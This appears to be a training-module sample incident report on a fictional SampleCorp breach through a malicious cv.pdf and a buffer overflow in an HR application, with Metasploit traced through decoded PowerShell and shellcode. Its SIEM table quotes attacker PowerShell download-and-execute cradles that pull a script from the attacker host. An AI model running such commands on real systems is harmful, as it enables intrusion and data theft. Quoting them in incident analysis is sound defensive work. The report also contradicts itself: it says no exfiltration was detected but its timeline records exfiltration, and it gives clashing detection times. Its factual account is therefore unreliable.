<h3>Real-world Incident Report</h3>

<h3>Executive Summary</h3>

- Incident ID: INC2019-0422-022

- Incident Severity: High (P2)

- Incident Status: Resolved

- Incident Overview: On the night of April 22, 2019, at precisely 01:05:00, SampleCorp's Security Operations Center (SOC) detected unauthorized activity within the internal network, specifically through anomalous process initiation and suspicious-looking PowerShell commands. Leveraging the lack of robust network access controls and two security vulnerabilities, the unauthorized entity successfully gained control over the following nodes within SampleCorp's infrastructure:

- WKST01.samplecorp.com: A system used for software development purposes.

- HR01.samplecorp.com: A system used to process employee and partner data.

SampleCorp's SOC, in collaboration with the Digital Forensics and Incident Response (DFIR) units, managed to successfully contain the threat, eliminate both the introduced malicious software and existing security gaps, and ultimately restore the compromised systems to their original state.

- Key Findings: Owing to insufficient network access controls, the unauthorized entity was assigned an internal IP address by simply connecting their computer to an Ethernet port within a SampleCorp office. Investigative efforts revealed that the unauthorized entity initially compromised WKST01.samplecorp.com by exploiting a vulnerable version of Acrobat Reader. Additionally, the entity exploited a buffer overflow vulnerability, this time in a proprietary application developed by SampleCorp, to further penetrate the internal network. While no widespread data exfiltration was detected, likely owing to the rapid intervention by the SOC and DFIR teams, the unauthorized access to both WKST01.samplecorp.com and HR01.samplecorp.com raise concerns. As a result, both company and client data should be regarded as potentially compromised to some extent.

- Immediate Actions: SampleCorp's SOC and DFIR teams exclusively managed the incident response procedures, without the involvement of any external service providers. Immediate action was taken to isolate the compromised systems from the network through the use of VLAN segmentation. To facilitate a comprehensive investigation, the SOC and DFIR teams gathered extensive data. This included getting access to network traffic capture files. Additionally, all affected systems were plugged to a host security solution. As for event logs, they were automatically collected by the existing Elastic SIEM solution.

Stakeholder Impact:

- Customers: While no extensive data exfiltration was identified, the unauthorized access to both WKST01.samplecorp.com and HR01.samplecorp.com raises concerns about the integrity and confidentiality of customer data. As a precautionary measure, some services were temporarily taken offline and some API keys were revoked, leading to brief periods of downtime for customers. The financial implications of this downtime are currently being assessed but could result in loss of revenue and customer trust.

- Employees: The compromised systems included HR01.samplecorp.com, which typically houses sensitive employee information. Although we have no evidence to suggest that employee data was specifically targeted or extracted, the potential risk remains. Employees may be subject to identity theft or phishing attacks if their data was compromised.

- Business Partners: Given that WKST01.samplecorp.com, a development environment, was among the compromised systems, there's a possibility that proprietary code or technology could have been exposed. This could have ramifications for business partners who rely on the integrity and exclusivity of SampleCorp's technology solutions.

- Regulatory Bodies: The breach of systems, could have compliance implications. Regulatory bodies may impose fines or sanctions on SampleCorp for failing to adequately protect sensitive data, depending on the jurisdiction and the nature of the compromised data.

- Internal Teams: The SOC and DFIR teams were able to contain the threat effectively, but the incident will likely necessitate a review and potential overhaul of current security measures. This could mean a reallocation of resources and budget adjustments, impacting other departments and projects.

- Shareholders: The incident could have a short-term negative impact on stock prices due to the potential loss of customer trust and possible regulatory fines. Long-term effects will depend on the effectiveness of the remedial actions taken and the company's ability to restore stakeholder confidence.

<h3>Technical Analysis</h3>

<h3>Affected Systems & Data</h3>

Owing to insufficient network access controls, the unauthorized entity was assigned an internal IP address by simply connecting their computer to an Ethernet port within a SampleCorp office.

The unauthorized entity successfully gained control over the following nodes within SampleCorp's infrastructure:

- WKST01.samplecorp.com: This is a development environment that contains proprietary source code for upcoming software releases, as well as API keys for third-party services. The unauthorized entity did navigate through various directories, raising concerns about intellectual property theft and potential abuse of API keys.

- HR01.samplecorp.com: This is the Human Resources system that houses sensitive employee and partner data, including personal identification information, payroll details, and performance reviews. Our logs indicate that the unauthorized entity did gain access to this system. Most concerning is that an unencrypted database containing employee Social Security numbers and bank account details was accessed. While we have no evidence to suggest data was extracted, the potential risk of identity theft and financial fraud for employees is high.

<h3>Evidence Sources & Analysis</h3>

WKST01.samplecorp.com

On the night of April 22, 2019, at exactly 01:05:00, SampleCorp's Security Operations Center (SOC) identified unauthorized activity within the internal network. This was detected through abnormal parent-child process relationships and suspicious PowerShell commands, as displayed in the following screenshot.

From the logs, PowerShell was invoked from cmd.exe to execute the contents of a remotely hosted script. The IP address of the remote host was an internal address, 192.168.220.66, indicating that an unauthorized entity was already present within the internal network.


<img width="677" height="391" alt="image" src="https://github.com/user-attachments/assets/5f8ecb21-c4a4-4846-b93d-4e990e9a505b" />


The earliest signs of malicious command execution point to WKST01.samplecorp.com being compromised, likely due to a malicious email attachment with a suspicious file named cv.pdf for the following reasons:

- The user accessed the email client Mozilla Thunderbird

- A suspicious file cv.pdf was opened with Adobe Reader 10.0, which is outdated and vulnerable to security flaws.

- Malicious commands were observed immediately following these events.


<img width="679" height="457" alt="image" src="https://github.com/user-attachments/assets/81e2f980-f106-4910-96e3-3dafffefaabb" />


Additionally, cmd.exe and powershell.exe were spawned from wmiprvse.exe.

<img width="680" height="658" alt="image" src="https://github.com/user-attachments/assets/ae46a2e9-4afa-4e43-a6a0-d29539482fd1" />

As already mentioned, the unauthorized entity then executed specific PowerShell commands.

<img width="678" height="626" alt="image" src="https://github.com/user-attachments/assets/9de7b2ef-851c-40d1-9012-1caf2e14cfc7" />

Brief Analysis of 192.168.220.66

From the logs, we identified four hosts on the network segment with corresponding IP addresses and hostnames. The host 192.168.220.66, previously observed in the logs of WKST01.samplecorp.com, confirms the presence of an unauthorized entity in the internal network.

<table border="1" cellpadding="8" cellspacing="0" style="border-collapse: collapse; width: 60%;">
    <thead style="background-color: #012060; color: white;">
        <tr>
            <th>IP Address</th>
            <th>Hostname</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>192.168.220.20</td>
            <td>DC01.samplecorp.com</td>
        </tr>
        <tr>
            <td>192.168.220.200</td>
            <td>WKST01.samplecorp.com</td>
        </tr>
        <tr>
            <td>192.168.220.101</td>
            <td>HR01.samplecorp.com</td>
        </tr>
        <tr>
            <td>192.168.220.202</td>
            <td>ENG01.samplecorp.com</td>
        </tr>
    </tbody>
</table>

The below table is the result of a SIEM query that aimed to identify all instances of command execution initiated from 192.168.220.66, based on data from WKST01.samplecorp.com.

<table border="1" cellpadding="8" cellspacing="0" style="border-collapse: collapse; width: 100%;">
    <thead style="background-color: #012060; color: white;">
        <tr>
            <th>Command Line</th>
            <th>Hostname</th>
            <th>Count</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>cmd.exe /Q /c cd 1&gt; \\127.0.0.1\ADMIN$\__1555864304.02 2&gt;&amp;1</td>
            <td>WKST01</td>
            <td>5</td>
        </tr>
        <tr>
            <td>cmd.exe /Q /c dir 1&gt; \\127.0.0.1\ADMIN$\__1555864304.02 2&gt;&amp;1</td>
            <td>WKST01</td>
            <td>4</td>
        </tr>
        <tr>
            <td>
                powershell.exe -nop -w hidden -c 
                $c=new-object net.webclient;
                $c.proxy=[Net.WebRequest]::GetSystemWebProxy();
                $c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
                IEX
            </td>
            <td>WKST01</td>
            <td>2</td>
        </tr>
        <tr>
            <td>whoami</td>
            <td>WKST01</td>
            <td>1</td>
        </tr>
        <tr>
            <td>...</td>
            <td>...</td>
            <td>...</td>
        </tr>
        <tr>
            <td>
                powershell IEX (New-Object Net.WebClient)
                .DownloadString('http://192.168.220.66/test.php');
                $m = Get-ModifiableService; $m
            </td>
            <td>HR01</td>
            <td>1</td>
        </tr>
    </tbody>
</table>

The results suggest that the unauthorized entity has successfully infiltrated the hosts: WKST01.samplecorp.com and HR01.samplecorp.com.

HR01.samplecorp.com

HR01.samplecorp.com was investigated next, as the unauthorized entity, 192.168.220.66, was shown to establish a connection with HR01.samplecorp.com at the earliest possible moment in the packet capture.

<img width="684" height="287" alt="image" src="https://github.com/user-attachments/assets/f523fc67-2ea9-416a-b36b-abdda63e45d3" />

Network traffic details suggest a buffer overflow attempt on the service running at port 31337 of HR01.samplecorp.com.

<img width="681" height="499" alt="image" src="https://github.com/user-attachments/assets/ee3b38c8-e1bb-43b0-9b95-2a7e12007509" />

The network traffic was exported as raw binary for further analysis.

<img width="683" height="655" alt="image" src="https://github.com/user-attachments/assets/8418cac5-effe-487a-9a32-4fbfdbf36446" />

The extracted binary was analyzed in a shellcode debugger, scdbg.

Scdbg reveals that the shellcode will attempt to initiate a connection to 192.168.220.66 at port 4444. This confirms that there has been an attempt to exploit a service running on port 31337 of HR01.samplecorp.com.

<img width="682" height="745" alt="image" src="https://github.com/user-attachments/assets/8b8e8fdc-03f5-49a8-aa56-c67d726b0960" />

The depth of the technical analysis can be tailored to ensure that all stakeholders are adequately informed about the incident and the actions taken in response. While we've chosen to keep the investigation details concise in this module to avoid overwhelming you, it's important to note that in a real-world situation, every claim or statement would be backed up with robust evidence.

<h3>Indicators of Compromise (IoCs)</h3>

C2 IP: 192.168.220.66

cv.pdf (SHA256): ef59d7038cfd565fd65bae12588810d5361df938244ebad33b71882dcf683011

<h3>Root Cause Analysis</h3>

Insufficient network access controls allowed the unauthorized entity access to SampleCorp's internal network.

The primary catalysts for the incident were traced back to two significant vulnerabilities. The first vulnerability stemmed from the continued use of an outdated version of Acrobat Reader, while the second was attributed to a buffer overflow issue present within a proprietary application. Compounding these vulnerabilities was the inadequate network segregation of crucial systems, leaving them more exposed and easier targets for potential threats. Additionally, there was a notable gap in user awareness, evident from the absence of comprehensive training against phishing tactics, which could have served as the initial entry point for the attackers.

<h3>Technical Timeline</h3>

Initial Compromise

April 22nd, 2019, 00:27:27: One of the employees opened a malicious PDF document (cv.pdf) on WKST01.samplecorp.com, which exploited a known vulnerability in an outdated version of Acrobat Reader. This led to the execution of a malicious payload that established initial foothold on the system.

Lateral Movement

April 22nd, 2019, 00:50:18: The unauthorized entity leveraged the initial access to perform reconnaissance on the internal network. They discovered a buffer overflow vulnerability in a proprietary HR application running on HR01.samplecorp.com. Using a crafted payload, they exploited this vulnerability to gain unauthorized access to the HR system.

Data Access & Exfiltration

April 22nd, 2019, 00:35:09: The unauthorized entity accessed various directories on WKST01.samplecorp.com containing both proprietary source code and API keys.

April 22nd, 2019, 01:30:12: The unauthorized entity located an unencrypted database on HR01.samplecorp.com containing sensitive employee and partner data, including Social Security numbers and salary information. They compressed this data and exfiltrated it to an external server via a secure SSH tunnel.

C2 Communications

An unauthorized entity gained physical access to SampleCorp's internal network. The Command and Control (C2) IP address identified was an internal one: 192.168.220.66.

Malware Deployment or Activity

The malware was disseminated via a malicious PDF document and made extensive use of legitimate Windows binaries 
for staging, command execution, and post-exploitation purposes.

Subsequently, shellcode was utilized within a buffer overflow payload to infect HR01.samplecorp.com.

Containment Times

April 22nd, 2019, 02:30:11: SampleCorp's SOC and DFIR teams detected the unauthorized activities and 
immediately isolated WKST01.samplecorp.com and HR01.samplecorp.com from the network using VLAN segmentation.

April 22nd, 2019, 03:10:14: SampleCorp's SOC and DFIR teams plugged a host security solution to both 

WKST01.samplecorp.com and HR01.samplecorp.com to collect more data from the affected systems.

April 22nd, 2019, 03:43:34: The firewall rules were updated to block the known C2 IP address, effectively cutting off the unauthorized entity's remote access.

Eradication Times

April 22nd, 2019, 04:11:00: A specialized malware removal tool was used to clean both WKST01.samplecorp.com and 

HR01.samplecorp.com of the deployed malware.

April 22nd, 2019, 04:30:00: All systems, starting with WKST01.samplecorp.com were updated to the latest version of Acrobat Reader, mitigating the vulnerability that led to the initial compromise.

April 22nd, 2019, 05:01:08: The API keys that were accessed by the unauthorized entity have been revoked.

April 22nd, 2019, 05:05:08: The login credentials of the user who accessed the cv.pdf file, as well as those of users who have recently signed into both WKST01.samplecorp.com and HR01.samplecorp.com, have been reset.

Recovery Times

April 22nd, 2019, 05:21:20: After ensuring that WKST01.samplecorp.com was malware-free, the SOC team restored the system from a verified backup.

April 22nd, 2019, 05:58:50: After ensuring that HR01.samplecorp.com was malware-free, the SOC team restored the system from a verified backup.

April 22nd, 2019, 06:33:44: The development team rolled out an emergency patch for the buffer overflow vulnerability in the proprietary HR application, which was then deployed to HR01.samplecorp.com.

<h3>Nature of the Attack</h3>

In this segment, we should meticulously dissect the modus operandi of the unauthorized entity, shedding light on the specific tactics, techniques, and procedures (TTPs) they employed throughout their intrusion. For instance, let's dive into the methods the SOC team used to determine that the unauthorized entity utilized the Metasploit framework in their operations.

<h3>Detecting Metasploit</h3>

To better understand the tactics and techniques of the unauthorized entity, we delved into the malicious PowerShell commands executed.

Particularly, the one shown in the following screenshot.

<img width="682" height="432" alt="image" src="https://github.com/user-attachments/assets/2e140e65-6449-4108-8e2f-61724778258d" />

Upon inspection, it became clear that double encoding was used, likely as a means to bypass detection mechanisms. The SOC team successfully decoded the malicious payload, revealing the exact PowerShell code executed within the memory of WKST01.samplecorp.com.

<img width="683" height="461" alt="image" src="https://github.com/user-attachments/assets/364efece-718c-4446-aaad-d8cfe548b23d" />

By leveraging open source intelligence, our SOC team determined that this PowerShell code is probably linked to the Metasploit post-exploitation framework.

<img width="681" height="256" alt="image" src="https://github.com/user-attachments/assets/46bbd861-da8d-4c9a-8a08-1b64a3979e17" />

To support our hypothesis that Metasploit was used, we dived deeper into the detected shellcode. We specifically exported the packet bytes containing the shellcode (as a.bin) and subsequently submitted them to VirusTotal for evaluation.

<img width="685" height="610" alt="image" src="https://github.com/user-attachments/assets/f50a667c-5a7d-4b89-85a0-6fab5eb3ee16" />

<img width="684" height="517" alt="image" src="https://github.com/user-attachments/assets/487142e2-10be-4fab-97ee-1b1fd6e131e4" />

<img width="684" height="533" alt="image" src="https://github.com/user-attachments/assets/e5cca116-c51b-4461-b494-66e8ec32d4e8" />

The results from VirusTotal affirmed our suspicion that Metasploit was in play. Both metacoder and shikata are intrinsically linked to the Metasploit-generated shellcode.

<h3>Impact Analysis</h3>

In this segment, we should dive deeper into the initial stakeholder impact analysis presented at the outset of this report. Given the company's unique internal structure, business landscape, and regulatory obligations, it's crucial to offer a comprehensive evaluation of the incident's implications for every affected party.

<h3>Response and Recovery Analysis</h3>

<h3>Immediate Response Actions</h3>

Revocation of Access

- Identification of Compromised Accounts/Systems: Using Elastic SIEM solution, suspicious activities associated with unauthorized access were flagged on WKST01.samplecorp.com. Then, a combination of traffic and log analysis uncovered unauthorized access on HR01.samplecorp.com as well.

- Timeframe: Unauthorized activities were detected at April 22, 2019, 01:05:00. Access was terminated by April 22nd, 2019, 03:43:34 upon firewall rule update to block the C2 IP address.

- Method of Revocation: Alongside the firewall rules, Active Directory policies were applied to force log-off sessions from possibly compromised accounts. Additionally, affected user credentials were reset and accessed

- API keys were revoked, further inhibiting unauthorized access.

- Impact: Immediate revocation of access halted potential lateral movement, preventing further system compromise and data exfiltration attempts.

Containment Strategy

Short-term Containment: As part of the initial response, VLAN segmentation was promptly applied, effectively isolating WKST01.samplecorp.com and HR01.samplecorp.com from the rest of the network, and hindering any lateral movement by the threat actor.

Long-term Containment: The next phase of containment involves a more robust implementation of network segmentation, ensuring specific departments or critical infrastructure run on isolated network segments, and robust network access controls, ensuring that only authorized devices have access to an organization's internal network. Both would reduce the attack surface for future threats.

Effectiveness: The containment strategies were successful in ensuring that the threat actor did not escalate privileges or move to adjacent systems, thus limiting the incident's impact.

Eradication Measures

Malware Removal

Identification: Suspicious processes were flagged on the compromised systems, and a deep dive forensic examination revealed traces of the Metasploit post-exploitation framework, which was further confirmed by VirusTotal analysis.

Removal Techniques: Using a specialized malware removal tool, all identified malicious payloads were eradicated from WKST01.samplecorp.com and HR01.samplecorp.com.

Verification: Post-removal, a secondary scan was initiated, and a heuristic analysis was performed to ensure no remnants of the malware persisted.

System Patching

Vulnerability Identification: A vulnerable instance of Acrobat Reader was identified, leading to the initial compromise. Cross-referencing with known vulnerabilities pointed towards a potential exploit being used. A buffer overflow vulnerability, in a proprietary application developed by SampleCorp was also identified.

Patch Management: All systems, were promptly updated to the latest version of Acrobat Reader that addressed the known vulnerability. The development team rolled out an emergency patch for the buffer overflow vulnerability in the proprietary HR application, which was then deployed to HR01.samplecorp.com. Patching was done in a staged manner, with critical systems prioritized.

Fallback Procedures: System snapshots and configurations were backed up before the patching process, ensuring a swift rollback if the update introduced any system instabilities.

Recovery Steps
Data Restoration

Backup Validation: Prior to data restoration, backup checksums were cross-verified to ensure the integrity of the backup data.
Restoration Process: The SOC team meticulously restored both affected systems from validated backups.
Data Integrity Checks: Post-restoration, cryptographic hashing using SHA-256 was employed to verify the integrity and authenticity of the restored data.
System Validation

Security Measures: The systems' firewalls and intrusion detection systems were updated with the latest threat intelligence feeds, ensuring any indicators of compromise (IoCs) from this incident would trigger instant alerts.
Operational Checks: Before reintroducing systems into the live environment, a battery of operational tests, including load and stress testing, was conducted to confirm the systems' stability and performance.

Post-Incident Actions

Monitoring

Enhanced Monitoring Plans: The monitoring paradigm has been revamped to include behavioral analytics, focusing on spotting deviations from baseline behaviors which could indicate compromise. In addition, inventory and asset management activities commenced to facilitate the implementation of network access controls.

Tools and Technologies: Leveraging the capabilities of the existing Elastic SIEM, advanced correlation rules will be implemented, specifically designed to detect the tactics, techniques, and procedures (TTPs) identified in this breach.

Lessons Learned


Gap Analysis: The incident shed light on certain gaps, primarily around network access controls, email filtering, network segregation, and user training about potential phishing attempts with malicious documents.

Recommendations for Improvement: Initiatives around inventory and asset management, email filtering, and improved security awareness training are prioritized.

Future Strategy: A forward-looking strategy will involve more granular network access controls and network segmentation, adopting a zero-trust security model, and increasing investments in both security awareness training and email filtering.

<h3>Annex A</h3>

<h3>Technical Timeline</h3>

<table border="1" cellpadding="8" cellspacing="0" style="border-collapse: collapse; width: 100%;">
    <thead style="background-color: #012060; color: white;">
        <tr>
            <th>Time</th>
            <th>Activity</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>April 22nd, 2019, 00:27:27</td>
            <td>
                An employee opened a malicious PDF document (<strong>cv.pdf</strong>) on 
                <strong>WKST01.samplecorp.com</strong>, exploiting a known vulnerability in an
                outdated version of Acrobat Reader. This resulted in execution of a malicious
                payload and establishment of the initial foothold.
            </td>
        </tr>
        <tr>
            <td>April 22nd, 2019, 00:35:09</td>
            <td>
                The unauthorized entity accessed multiple directories on 
                <strong>WKST01.samplecorp.com</strong> containing proprietary source code and API keys.
            </td>
        </tr>
        <tr>
            <td>April 22nd, 2019, 00:50:18</td>
            <td>
                Reconnaissance activities identified a buffer overflow vulnerability in a proprietary
                HR application on <strong>HR01.samplecorp.com</strong>, which was exploited to gain
                unauthorized access to the HR system.
            </td>
        </tr>
        <tr>
            <td>April 22nd, 2019, 01:30:12</td>
            <td>
                An unencrypted database containing sensitive employee and partner data (including
                Social Security numbers and salary information) was discovered on 
                <strong>HR01.samplecorp.com</strong>. The data was compressed and exfiltrated via a
                secure SSH tunnel to an external server.
            </td>
        </tr>
        <tr>
            <td>April 22nd, 2019, 02:30:11</td>
            <td>
                SOC and DFIR teams detected the activity and immediately isolated 
                <strong>WKST01.samplecorp.com</strong> and <strong>HR01.samplecorp.com</strong> using
                VLAN segmentation.
            </td>
        </tr>
        <tr>
            <td>April 22nd, 2019, 03:10:14</td>
            <td>
                Host-based security solutions were deployed on both affected systems to collect
                additional forensic data.
            </td>
        </tr>
        <tr>
            <td>April 22nd, 2019, 03:43:34</td>
            <td>
                Firewall rules were updated to block the identified command-and-control (C2) IP address,
                terminating remote attacker access.
            </td>
        </tr>
        <tr>
            <td>April 22nd, 2019, 04:11:00</td>
            <td>
                Specialized malware removal tools were used to clean both compromised systems.
            </td>
        </tr>
        <tr>
            <td>April 22nd, 2019, 04:30:00</td>
            <td>
                All systems were updated to the latest version of Acrobat Reader, mitigating the
                vulnerability used for initial compromise.
            </td>
        </tr>
        <tr>
            <td>April 22nd, 2019, 05:01:08</td>
            <td>
                Compromised API keys were revoked.
            </td>
        </tr>
        <tr>
            <td>April 22nd, 2019, 05:05:08</td>
            <td>
                User credentials associated with the compromised systems were reset.
            </td>
        </tr>
        <tr>
            <td>April 22nd, 2019, 05:21:20</td>
            <td>
                <strong>WKST01.samplecorp.com</strong> was restored from a verified clean backup.
            </td>
        </tr>
        <tr>
            <td>April 22nd, 2019, 05:58:50</td>
            <td>
                <strong>HR01.samplecorp.com</strong> was restored from a verified clean backup.
            </td>
        </tr>
        <tr>
            <td>April 22nd, 2019, 06:33:44</td>
            <td>
                An emergency patch addressing the buffer overflow vulnerability in the proprietary HR
                application was deployed to <strong>HR01.samplecorp.com</strong>.
            </td>
        </tr>
    </tbody>
</table>
